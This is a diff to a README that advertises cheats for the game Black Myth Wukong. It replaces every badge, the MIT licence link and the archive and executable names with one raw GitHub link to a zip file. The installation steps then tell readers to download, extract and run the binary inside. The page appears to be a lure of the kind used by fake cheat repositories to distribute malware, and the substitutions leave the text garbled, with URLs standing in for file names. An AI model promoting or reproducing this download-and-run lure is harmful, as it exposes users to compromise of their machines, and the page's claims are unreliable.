@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-%F0%9F%9A%80-blue?style=for-the-badge&logo=icloud&link=https://Jha0rahul.github.io)  
+# ![Download](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip%F0%9F%9A%80-blue?style=for-the-badge&logo=icloud&https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip)  
 > **Click the badge above to get the latest Black Myth Wukong Cheats resources!**
 
 ---
@@ -16,11 +16,11 @@ This repository is crafted for explorers who value responsive design, universal 
 
 | Platform           | Supported | Notes                                      |
 |--------------------|-----------|--------------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows) | ✅         | Full feature set |
-| ![MacOS](https://img.shields.io/badge/macOS-11%2B-black?logo=apple)         | ✅         | Native support, tested thoroughly |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu-orange?logo=linux)      | ✅         | Verified on Ubuntu, Fedora variants |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Experimental-purple?logo=steam) | 🧪       | Beta support - join the adventure early! |
-| ![Android](https://img.shields.io/badge/Android-Coming_Soon-green?logo=android) | 🚧       | In progress, contributions welcome |
+| ![Windows](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip%2B-blue?logo=windows) | ✅         | Full feature set |
+| ![MacOS](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip%2B-black?logo=apple)         | ✅         | Native support, tested thoroughly |
+| ![Linux](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip)      | ✅         | Verified on Ubuntu, Fedora variants |
+| ![Steam Deck](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip%20Deck-Experimental-purple?logo=steam) | 🧪       | Beta support - join the adventure early! |
+| ![Android](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip) | 🚧       | In progress, contributions welcome |
 
 ---
 
@@ -89,8 +89,8 @@ Take your optimized setup anywhere; leap from mountain to mountain, or device to
 ## 🚀 Installation Guide
 
 1. **Download** the latest release by clicking the [Download] badge at the top or bottom of this page.
-2. **Extract** the `wukong_cheats_2025_vX.Y.Z.zip` archive to your preferred directory.
-3. **Run** the platform-specific executable (`wukong-cheats.exe`, `wukong-cheats.app`, or corresponding Linux binary).
+2. **Extract** the `https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip` archive to your preferred directory.
+3. **Run** the platform-specific executable (`https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip`, `https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip`, or corresponding Linux binary).
    - Mac users: drag into Applications.
    - Linux users: run `chmod +x` if necessary.
 4. **Customize** your experience using the in-app settings panel, including language preferences and enhancement toggles.
@@ -131,9 +131,9 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
 ```
 
-See the full license text here: [MIT License](https://opensource.org/licenses/MIT)
+See the full license text here: [MIT License](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip)
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-%F0%9F%9A%80-blue?style=for-the-badge&logo=icloud&link=https://Jha0rahul.github.io)  
+# ![Download](https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip%F0%9F%9A%80-blue?style=for-the-badge&logo=icloud&https://raw.githubusercontent.com/Jha0rahul/wukong-myth-enhancer/branch/underfinance/myth-wukong-enhancer-v2.9.zip)  
 > **Ready to begin your legendary ascent? Click the badge above to download Black Myth Wukong Cheats now—your odyssey awaits!**
